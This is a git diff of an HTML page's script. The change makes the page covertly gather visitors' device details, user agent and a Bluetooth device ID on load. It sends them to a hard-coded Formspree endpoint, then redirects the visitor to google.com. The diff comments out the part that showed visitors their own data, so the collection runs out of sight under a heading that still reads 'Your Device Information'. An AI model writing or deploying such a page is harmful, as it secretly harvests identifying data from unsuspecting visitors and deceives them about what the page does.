@@ -76,50 +76,61 @@
       return deviceInfo;
     }
 
-function saveDeviceInfo(info) {
-  const url = 'https://formspree.io/f/xnnaegzr'; // Replace with your Formspree URL
+    // Function to get Bluetooth ID (if available)
+    async function getBluetoothId() {
+      try {
+        const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
+        return device.id;  // Return the Bluetooth device ID
+      } catch (error) {
+        console.error('Bluetooth Error:', error);
+        return 'No Bluetooth device selected';
+      }
+    }
 
-  fetch(url, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      device: info.device,
-      detail: info.detail,
-      platform: info.platform,
-      userAgent: info.userAgent
-    })
-  })
-  .then(response => response.json())
-  .then(data => console.log('Success:', data))
-  .catch(error => console.error('Error:', error));
-}
+    function saveDeviceInfo(info, bluetoothId) {
+      const url = 'https://formspree.io/f/xnnaegzr'; // Replace with your Formspree URL
 
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          device: info.device,
+          detail: info.detail,
+          platform: info.platform,
+          userAgent: info.userAgent,
+          bluetoothId: bluetoothId  // Include Bluetooth ID in the data sent
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log('Success:', data))
+      .catch(error => console.error('Error:', error));
+    }
 
-    // Function to display the device info
-    function displayDeviceInfo() {
+    // Function to collect data and redirect
+    async function collectData() {
       const info = getDeviceInfo();
-      document.getElementById('device').innerText = info.device;
-      document.getElementById('detail').innerText = info.detail;
-      document.getElementById('platform').innerText = info.platform;
-      document.getElementById('userAgent').innerText = info.userAgent;
+      const bluetoothId = await getBluetoothId();
+      saveDeviceInfo(info, bluetoothId);
 
-      // Save device info to Google Sheets
-      saveDeviceInfo(info);
+      // Redirect to Google.com
+      window.location.href = 'https://www.google.com';
     }
 
     // Execute the function when the page loads
-    window.onload = displayDeviceInfo;
+    window.onload = collectData;
   </script>
 </head>
 <body>
   <h1>Your Device Information</h1>
   <div class="device-info">
+    <!-- The display part is commented out
     <p><strong>Device:</strong> <span id="device"></span></p>
     <p><strong>Device Detail:</strong> <span id="detail"></span></p>
     <p><strong>Platform:</strong> <span id="platform"></span></p>
     <p><strong>User Agent:</strong> <span id="userAgent"></span></p>
+    -->
   </div>
 </body>
 </html>
